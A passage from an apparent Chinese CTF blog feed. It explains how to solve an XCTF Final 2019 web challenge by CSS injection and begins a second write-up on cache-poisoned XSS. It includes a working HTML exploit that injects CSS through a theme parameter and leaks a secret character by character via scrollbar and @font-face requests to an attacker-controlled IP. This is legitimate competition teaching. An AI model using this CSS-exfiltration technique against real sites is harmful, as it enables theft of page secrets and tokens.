1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120133900.png" alt=""></p><p>但是我们的最终目的跟 token2 场景类似，还是拿到 script 标签中的 secret 变量</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120134348.png" alt=""></p><p>根据 token2 场景的解法，接下来我们至少需要做到可以执行我们任意 css 代码才行。</p><p>根据文档<a href="https://www.w3.org/TR/css-syntax-3/#newline-diagram" target="_blank" rel="noopener">css newline</a>，我们可以知道换行有如下写法：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://xzfile.aliyuncs.com/media/upload/picture/20191029162244-48373126-fa25-1.png" alt=""></p><p>而且文档里也提到了<a href="https://www.w3.org/TR/css-syntax-3/#error-handling" target="_blank" rel="noopener">error-handling</a></p><blockquote><p>​    When errors occur in CSS, the parser attempts to recover gracefully, throwing away only the minimum amount of content before returning to parsing as normal. This is because errors aren’t always mistakes—new syntax looks like an error to an old parser, and it’s useful to be able to add new syntax to the language without worrying about stylesheets that include it being completely broken in older UAs.</p></blockquote><p>css 兼容性比较强，对于错误的处理也比较宽松，这里由于自己的知识有限，也暂时没有找到 chrome 对于 css 错误处理相关的内容，但是经过我们不断尝试，我们可以发现使用如下 payload 可以任意执行我们的 css 代码：</p><p></p><figure class="highlight css hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0<span class="hljs-selector-tag">a</span>){}<span class="hljs-selector-tag">body</span>{<span class="hljs-attribute">background</span>:red}%2<span class="hljs-selector-tag">f</span>*</span><br></pre></td></tr></tbody></table></figure><p></p><p>对于以上，问了 @zsx 师傅，以下是他的原话（<del>你看看这是人说的吗</del>orz）：</p><blockquote><p>​    我wp写了，看了下w3c标准，再随便fuzz一下就ok了</p></blockquote><p>我的理解是这里用<code>%0a</code>进行了换行，但是由于括号的解析还没结束，所以我们需要用<code>)</code>来将<code>import</code>的括号进行闭合，然后再用<code>{}</code>制定空样式，后面就可以任意注入 css 代码了。</p><p>如果有师傅看了 chromium 有非常硬核的理解，还望不吝赐教，带带我这个菜鸡。//感觉本文的关键点也不在这</p><p>然后我们就可以利用 token2 的方法，利用滚动条来 leak secret 了，只要自己做个 iframe 引用我们构造的 payload 即可，比如</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">//const chars = ['t','f']</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-keyword">const</span> chars = <span class="hljs-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'</span>.split(<span class="hljs-string">''</span>)</span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">let</span> ff = [],</span></span><br><span class="line"><span class="hljs-actionscript">            data = <span class="hljs-string">''</span></span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">let</span> prefix = <span class="hljs-string">'xctf{'</span></span></span><br><span class="line"><span class="hljs-javascript">        chars.forEach(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-keyword">var</span> css = <span class="hljs-string">''</span></span></span><br><span class="line"><span class="hljs-actionscript">            css = <span class="hljs-string">'?theme=../../../../\fa{}){}'</span></span></span><br><span class="line">            css +=</span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-string">`body{overflow-y:hidden;overflow-x:auto;white-space:nowrap;display:block}html{display:block}*{display:none}body::-webkit-scrollbar{display:block;background: blue url(http://172.16.71.138:9999/?<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(prefix+c)}</span>)}`</span></span></span><br><span class="line"><span class="hljs-javascript">            css += <span class="hljs-string">`@font-face{font-family:a<span class="hljs-subst">${c.charCodeAt()}</span>;src:url(http://172.16.71.138:23460/font/<span class="hljs-subst">${prefix}</span>/<span class="hljs-subst">${c}</span>);}`</span></span></span><br><span class="line"><span class="hljs-javascript">            css += <span class="hljs-string">`script{font-family:a<span class="hljs-subst">${c.charCodeAt()}</span>;display:block}`</span></span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-built_in">document</span>.write(</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-string">'&lt;iframe scrolling=yes samesite src="http://127.0.0.1/noxss.php?theme='</span> +</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-built_in">encodeURIComponent</span>(css) +</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-string">'" style="width:1000000px" onload="event.target.style.width=\'100px\'"&gt;&lt;/iframe&gt;'</span>)</span></span><br><span class="line">        })</span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这里我用 php 简单模拟了题目环境，做起来比较简便，也比较开心</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191121002617.png" alt=""></p><p>And…</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191121002928.png" alt=""></p><p>现场做出来的真是 CSS 带师 orz…</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://xz.aliyun.com/t/6655#toc-5" target="_blank" rel="noopener">XCTF final 2019 Writeup By ROIS</a></p><p><a href="https://www.smi1e.top/通过css注入窃取html中的数据/" target="_blank" rel="noopener">通过CSS注入窃取HTML中的数据</a></p><p><a href="https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/" target="_blank" rel="noopener">Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację</a></p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;这是本次比赛做起来最有跪感的一题了，当时比赛的时候怎么都弄不出来…赛后问了一下，主要还是差了一篇文章 &lt;a href=&quot;https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację&lt;/a&gt;，这个标题是个波兰语，中文翻译过来就是使用 CSS 攻击 Web 应用程序，从文章内容也看到了 RPO 的攻击引述，也正是之前 noxss 2017 的解法。&lt;/p&gt;
&lt;blockquote class=&quot;colorquote success&quot;&gt;&lt;p&gt;文章首发于先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/6812&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/6812&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>XCTF Final 2019 Web Write Up</title>
    <link href="https://blog.zeddyu.info/2019/11/14/XCTF-Final-2019/"/>
    <id>https://blog.zeddyu.info/2019/11/14/XCTF-Final-2019/</id>
    <published>2019-11-14T00:02:53.000Z</published>
    <updated>2021-09-27T17:45:58.720Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>我们 SU 这次一共做出了3个 Web ，由于今年 XCTF Final 的时间不是特别好，我们队其他师傅有考试的考试，基本就现场的两个 Web 手在做，最后 LFI2019 比较可惜，如果多个几 min 我们就可以出了，实在可惜。下面就写写本次的 Web Write Up。</p><a id="more"></a><p>[TOC]</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="babyblog"><a href="#babyblog" class="headerlink" title="babyblog"></a>babyblog</h2><p>界面跟 Byte CTF 的 <a href="https://blog.zeddyu.info/2019/09/17/bytectf2019/#babyblog">babyblog</a> 一致，有些功能还保留着，很有误导性…以为是个升级版，前者是一道二次注入后用 php 正则<code>/e</code>特性来执行命令的，所以我们一开始也就一直在日注入了…</p><p>后来我发现<code>/user</code>个人界面有 ip 记录，于是尝试 XFF 注入无果，但是可以把 XFF 直接回显到页面上。发现<code>/server_status</code>，发现有大家的访问记录。陷入思考ing…</p><p>队友突然看到有一个访问记录<code>/user/1.css</code>（类似的这么一个路由，不太想得起来了），马上想到可能是缓存投毒，联想跟上文说的 XFF 的设置，想到可以缓存投毒将反射 xss 变成缓存 xss ，这样就可以打到 admin 了。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6